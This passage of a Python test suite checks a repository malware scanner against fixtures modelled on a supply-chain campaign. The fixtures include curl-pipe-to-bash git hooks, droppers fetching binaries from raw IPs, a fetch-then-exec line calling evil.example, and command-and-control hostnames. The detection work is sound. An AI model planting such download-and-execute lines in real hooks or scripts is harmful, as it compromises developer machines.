        self.assertEqual({"critical", "high"}, set(merged["block_severities"]))

    def test_overlay_may_tighten(self):
        merged, findings = scan_repo.merge_policy(POLICY, {"block_severities": ["critical", "high", "medium"]})
        self.assertEqual([], findings)
        self.assertIn("medium", merged["block_severities"])

    def test_overlay_cannot_loosen_the_audit_floor(self):
        strict = {**POLICY, "audit_severity": "high"}
        merged, findings = scan_repo.merge_policy(strict, {"audit_severity": "critical"})
        self.assertIn("POLICY_OVERLAY_WEAKENED", {f.rule for f in findings})
        self.assertEqual("high", merged["audit_severity"])

    def test_overlay_may_tighten_the_audit_floor(self):
        merged, findings = scan_repo.merge_policy(POLICY, {"audit_severity": "moderate"})
        self.assertEqual([], findings)
        self.assertEqual("moderate", merged["audit_severity"])

    def test_non_object_overlay_is_rejected(self):
        merged, findings = scan_repo.merge_policy(POLICY, ["not", "an", "object"])
        self.assertIn("POLICY_OVERLAY_INVALID", {f.rule for f in findings})
        self.assertEqual(POLICY["block_severities"], merged["block_severities"])


class NeotreeIncidentTests(unittest.TestCase):
    """Fixtures drawn from the Neotree internal incident report (2026-09-02).

    That report records payloads appended directly to application ENTRY POINTS, giving
    execution at service startup rather than only during a build, and attributes the
    force-push bursts to a compromised account.
    """

    def scan(self, root: Path):
        return scan_repo.scan_repository(root, POLICY, IOCS, None, False, FIXED_TODAY)

    def test_confirmed_entrypoint_infections_are_detected(self):
        """node-api/index.js, dhis-integration/app.js, impilo-shr-adapter/fhir-adapter/index.ts."""
        for rel in ("index.js", "app.js", "fhir-adapter/index.ts", "server.ts", "src/main.ts"):
            with self.subTest(rel=rel), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                # legitimate entry point plus an appended payload: no marker, no eval, no padding
                write(root, rel, "require('./server').start();" + "q" * 2200 + ";")
                self.assertIn("ENTRYPOINT_LINE_ANOMALY", rules(self.scan(root)),
                              f"appended payload in {rel} not detected")

    def test_real_entrypoints_pass(self):
        """Across 3,975 entry-point files on all 85 branches the longest line is 1,004 chars."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "server/index.js",
                  "const next = require('next');\n"
                  "const app = next({ dev: process.env.NODE_ENV !== 'production' });\n"
                  "app.prepare().then(() => require('./listen')());\n")
            write(root, "middleware.ts", "export { auth as middleware } from '@/auth';\n")
            self.assertEqual([], blocking(self.scan(root)))

    def test_blockchain_c2_infrastructure_blocks(self):
        """No legitimate blockchain use here, and these hosts are confirmed campaign C2."""
        for host in ("api.trongrid.io", "bsc-dataseed.binance.org", "eth.drpc.org", "1rpc.io"):
            with self.subTest(host=host), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                write(root, "src/loader.ts", f"const RPC = 'https://{host}/v1/accounts/';\n")
                hits = by_rule(self.scan(root), "POLINRIDER_INFRA")
                self.assertTrue(hits, f"{host} not detected")
                self.assertIn(hits[0].severity, POLICY["block_severities"])

    def test_every_known_campaign_identifier_matches_the_shape_rule(self):
        """New intel added three identifiers (2-35-5/16/17) and required no rule change."""
        for value in ("2-35-5", "2-35-16", "2-35-17", "5-4-27", "A10-*19290",
                      "4-1928", "8-1638-2", "9-0191-4", "A4-1928", "NPM"):
            for form in (f"global.i='{value}'", f'global.i="{value}"',
                         f"global['_V']='{value}'", f"global.e='{value}'"):
                with self.subTest(form=form):
                    self.assertTrue(scan_repo.POLINRIDER_GLOBAL_TAG.search(form),
                                    f"shape rule missed {form}")

    def test_tron_indicator_is_a_valid_address_length(self):
        """A malformed indicator silently never matches. TRON base58 addresses are 34 chars."""
        tron = [m for m in IOCS["markers"] if m.startswith("T") and len(m) > 25]
        self.assertTrue(tron)
        for addr in tron:
            self.assertEqual(34, len(addr), f"{addr} is {len(addr)} chars, not a valid TRON address")

    def test_spoofed_author_metadata_is_flagged(self):
        """Author display names carrying invisible directional marks misattribute a commit."""
        import subprocess
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "README.md", "x\n")
            env = {**os.environ,
                   "GIT_AUTHOR_NAME": "Wilson\u202e Kumalo", "GIT_AUTHOR_EMAIL": "w@neotree.org",
                   "GIT_COMMITTER_NAME": "Wilson\u202e Kumalo", "GIT_COMMITTER_EMAIL": "w@neotree.org"}
            for cmd in (["git", "init", "-q"], ["git", "add", "-A"],
                        ["git", "-c", "commit.gpgsign=false", "commit", "-qm", "x"]):
                subprocess.run(cmd, cwd=root, env=env, check=True,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            hits = by_rule(self.scan(root), "COMMIT_AUTHOR_ANOMALY")
            self.assertTrue(hits)
            self.assertEqual("high", hits[0].severity)

    def test_ordinary_author_metadata_is_not_flagged(self):
        import subprocess
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "README.md", "x\n")
            env = {**os.environ,
                   "GIT_AUTHOR_NAME": "Wilson Kumalo", "GIT_AUTHOR_EMAIL": "wilson@neotree.org",
                   "GIT_COMMITTER_NAME": "Wilson Kumalo", "GIT_COMMITTER_EMAIL": "wilson@neotree.org"}
            for cmd in (["git", "init", "-q"], ["git", "add", "-A"],
                        ["git", "-c", "commit.gpgsign=false", "commit", "-qm", "x"]):
                subprocess.run(cmd, cwd=root, env=env, check=True,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.assertNotIn("COMMIT_AUTHOR_ANOMALY", rules(self.scan(root)))

    def test_no_account_identity_is_used_as_an_indicator(self):
        """Identity is not an indicator.

        This malware runs on a compromised developer machine and pushes with whatever
        cached Git credentials it finds, so the account on a malicious commit belongs to a
        victim. Denylisting it would name that person publicly while catching only the one
        account already known to be burned; the next compromise would be a different one.
        Author metadata is checked for spoofing instead, which applies to everyone equally.
        """
        self.assertNotIn("denylisted_commit_authors", IOCS)
        src = (SECURITY / "scan_repo.py").read_text(encoding="utf-8")
        self.assertNotIn('iocs.get("denylisted', src)
        self.assertIn("COMMIT_AUTHOR_ANOMALY", src)


class PolinRiderCampaignTests(unittest.TestCase):
    """Fixtures modelled on the behaviours reported in GitHub community discussions
    188732 and 197873. Detection must not depend on having seen a variant's exact marker.
    """

    PAYLOAD = "eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString());"
    PAD = " " * 300

    def scan(self, root: Path):
        return scan_repo.scan_repository(root, POLICY, IOCS, None, False, FIXED_TODAY)

    def png(self, extra: bytes = b"") -> bytes:
        import struct, zlib
        def chunk(t, d):
            c = t + d
            return struct.pack(">I", len(d)) + c + struct.pack(">I", zlib.crc32(c))
        return (b"\x89PNG\r\n\x1a\n"
                + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
                + chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00"))
                + chunk(b"IEND", b"") + extra)

    # The property name and the version literal both change per build, so detection
    # must match the shape. These cover the published variants plus invented ones.
    TAG_VARIANTS = [
        "global['!']='4-1928'", "global['!']='9-0191-4'", "global['!']='8-1638-2'",
        'global.i="A10-*19290"', "global.i='5-4-27'", "global['_V']='A4-1928'",
        "global.e='NPM'",
        # never-published shapes: any property, any version, any quote style
        "global.o='7-2231-9'", "global.a='1-1'", 'global.x="12-9"', "global.z='0'",
        "global['o']='3-77'", "global['q']='B99-0000-7'", "global.i=`5-4-27`",
        "globalThis.i='5-4-27'", "globalThis.o='42-7'", "global . o = '99-1' ",
    ]

    NON_TAGS = [
        "global.foo='bar'", "globalThis.crypto=webcrypto", "global.__DEV__=true",
        "myGlobal.i='x'", "global.fetch=nodeFetch", "window.i='5-4-27'",
    ]

    def test_campaign_tag_blocks_for_any_property_and_any_version(self):
        for i, tag in enumerate(self.TAG_VARIANTS):
            with self.subTest(tag=tag), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                write(root, f"src/mod{i}.ts", f"export const a=1;\n{tag};\n")
                self.assertIn("POLINRIDER_GLOBAL_TAG", rules(self.scan(root)),
                              f"variant not detected: {tag}")

    def test_ordinary_global_assignments_are_not_flagged(self):
        for i, src in enumerate(self.NON_TAGS):
            with self.subTest(src=src), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                write(root, f"src/ok{i}.ts", f"{src};\n")
                self.assertNotIn("POLINRIDER_GLOBAL_TAG", rules(self.scan(root)))

    def test_obfuscator_identifier_family_blocks_not_just_the_published_name(self):
        for i, name in enumerate(["_$_1e42", "_$_ab12", "_$_0f", "_$_deadbeef", "_$_9C3a"]):
            with self.subTest(name=name), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                write(root, f"src/o{i}.js", f"var {name}=['x'];module.exports={name};\n")
                self.assertIn("OBFUSCATED_IDENTIFIER", rules(self.scan(root)))

    def test_ordinary_dollar_identifiers_are_not_flagged(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/ok.js", "const $_x=1, _$=2, $$=3, _private=4;\nexport {$_x};\n")
            self.assertNotIn("OBFUSCATED_IDENTIFIER", rules(self.scan(root)))

    def test_ordinary_source_files_are_scanned_not_just_configs(self):
        """The payload is injected into plain js/mjs/ts too, not only build configs."""
        for rel in ("src/utils/helpers.ts", "lib/deep/nested/thing.mjs",
                    "components/Widget.tsx", "server/handler.js", "a/b/c.cjs"):
            with self.subTest(rel=rel), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                write(root, rel, "export const x=1;" + self.PAD + self.PAYLOAD)
                found = rules(self.scan(root))
                self.assertIn("HIDDEN_WHITESPACE", found)
                self.assertIn("DECODE_AND_EXECUTE", found)

    def test_svg_embedded_script_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/logo.svg",
                  '<svg xmlns="http://www.w3.org/2000/svg"><script>' + self.PAYLOAD + "</script></svg>")
            self.assertIn("MARKUP_EMBEDDED_SCRIPT", rules(self.scan(root)))

    def test_payload_appended_to_a_valid_png_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/hero.png", self.png(self.PAYLOAD.encode()))
            self.assertIn("ASSET_EMBEDDED_SCRIPT", rules(self.scan(root)))

    def test_payload_behind_a_forged_font_length_header_blocks(self):
        """The declared length is attacker-controlled, so structure parsing alone is not enough."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/fonts/x.woff2", b"wOF2" + b"\x00" * 200 + self.PAYLOAD.encode())
            self.assertIn("ASSET_EMBEDDED_SCRIPT", rules(self.scan(root)))

    def test_script_masquerading_as_an_image_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/logo.png", self.PAYLOAD.encode())
            self.assertIn("FAKE_IMAGE", rules(self.scan(root)))

    def test_marker_inside_an_undecodable_binary_is_found(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/x.bin", b"\x00\x01\x02" + b"global['!']='4-1928'" + b"\x00" * 32)
            self.assertIn("POLINRIDER_IOC", rules(self.scan(root)))

    def test_git_hook_download_and_execute_blocks(self):
        for rel in (".husky/post-checkout", ".githooks/post-merge", "scripts/post-checkout"):
            with self.subTest(rel=rel), tempfile.TemporaryDirectory() as td:
                root = Path(td)
                write(root, rel, "#!/bin/sh\ncurl https://evil.example/p.sh | bash\n")
                self.assertIn("DOWNLOAD_EXECUTE", rules(self.scan(root)))

    def test_batch_dropper_is_scanned(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "config.bat", "@echo off\ncurl http://198.105.127.210/x.exe -o x.exe\n")
            self.assertTrue(blocking(self.scan(root)))

    def test_gitignore_hiding_a_dropper_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, ".gitignore", "node_modules\nconfig.bat\n")
            self.assertIn("DROPPER_IGNORE_ENTRY", rules(self.scan(root)))

    def test_gitignore_reincluding_a_real_env_file_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, ".gitignore", ".env*\n!.env.production\n")
            self.assertIn("GITIGNORE_ENV_UNIGNORED", rules(self.scan(root)))

    def test_gitignore_reincluding_an_example_env_is_fine(self):
        """`!.env-example` is normal and must not be flagged."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, ".gitignore", ".env*\n!.env-example\n!.env.sample\n")
            self.assertNotIn("GITIGNORE_ENV_UNIGNORED", rules(self.scan(root)))

    def test_oversized_build_config_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "tailwind.config.js", "module.exports={};\n" + ("// " + "A" * 100 + "\n") * 400)
            self.assertIn("OVERSIZED_CONFIG", rules(self.scan(root)))

    def test_genuine_assets_do_not_false_positive(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/real.png", self.png())
            write(root, "public/fonts/real.woff2", b"wOF2" + (300).to_bytes(4, "big") + b"\x00" * 292)
            write(root, "public/plain.svg",
                  '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>')
            write(root, "next.config.mjs", "export default { reactStrictMode: true };\n")
            write(root, ".gitignore", "node_modules\n.env*\n!.env-example\n")
            self.assertEqual([], blocking(self.scan(root)))

    def test_decode_uri_component_is_not_an_obfuscation_decoder(self):
        """Ordinary URL handling must not escalate a download helper to CRITICAL."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "lib/import.ts",
                  "import { execFileSync } from 'child_process';\n"
                  "const name = decodeURIComponent(new URL(u).pathname);\n"
                  "const r = await fetch('https://builds.example.com/a.apk');\n")
            hits = by_rule(self.scan(root), "NETWORK_PROCESS_CHAIN")
            self.assertTrue(hits, "the exec+network surface is still worth reporting")
            self.assertEqual("high", hits[0].severity,
                             "decodeURIComponent must not corroborate it to critical")

    def test_base64_decode_beside_exec_still_escalates(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "lib/x.ts",
                  "import { execSync } from 'child_process';\n"
                  "const r = await fetch('https://evil.example/p');\n"
                  "execSync(Buffer.from(await r.text(), 'base64').toString());\n")
            hits = by_rule(self.scan(root), "NETWORK_PROCESS_CHAIN")
            self.assertEqual("critical", hits[0].severity)

    def test_html_with_an_external_script_tag_is_not_flagged(self):
        """An HTML document loading a bundle is an HTML document, not a payload."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "src/index.html",
                  '<html><body><div id="root"></div>'
                  '<script type="text/javascript" src="/bundle.js"></script></body></html>')
            self.assertNotIn("MARKUP_EMBEDDED_SCRIPT", rules(self.scan(root)))

    def test_svg_with_script_is_still_flagged(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "public/i.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>')
            self.assertIn("MARKUP_EMBEDDED_SCRIPT", rules(self.scan(root)))

    def test_checksum_verified_download_is_advisory_not_blocking(self):
        """A pinned-digest installer is not a dropper; it must not block the build."""
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "tools/install.sh",
                  "#!/usr/bin/env bash\nset -Eeuo pipefail\n"
                  'curl --fail --location "$URL" --output "$TARBALL"\n'
                  "printf '%s  %s\\n' \"$SHA256\" \"$TARBALL\" | sha256sum --check --status\n")
            found = self.scan(root)
            hits = by_rule(found, "SHELL_REMOTE_FETCH")
            self.assertTrue(hits)
            self.assertEqual("medium", hits[0].severity)
            self.assertEqual([], blocking(found))

    def test_unverified_download_in_a_shell_script_blocks(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            write(root, "tools/setup.sh", "#!/bin/sh\ncurl http://23.27.202.27/p.bin -o /tmp/p.bin\n")
            hits = by_rule(self.scan(root), "SHELL_REMOTE_FETCH")
            self.assertEqual("high", hits[0].severity)


if __name__ == "__main__":
    unittest.main(verbosity=2)
